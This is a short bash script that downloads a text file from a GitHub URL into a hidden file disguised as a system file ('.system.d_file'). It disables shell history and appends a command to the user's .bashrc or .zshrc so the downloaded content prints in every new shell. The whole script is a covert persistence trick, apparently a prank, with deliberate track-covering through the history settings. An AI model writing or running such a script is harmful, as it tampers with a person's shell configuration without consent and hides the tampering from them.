#!/bin/bash

TARGETPATH=$HOME/.system.d_file

wget -O $TARGETPATH https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus.txt

unset HISTFILE
set +o history

if [[ -n "$(echo $SHELL | grep 'zsh')" ]]; then
    echo -e "\ncat $TARGETPATH" >> ${ZDOTDIR:-$HOME}/.zshrc
elif [[ -n "$(echo $SHELL | grep 'bash')" ]]; then
    echo -e "\ncat $TARGETPATH" >> ~/.bashrc
fi
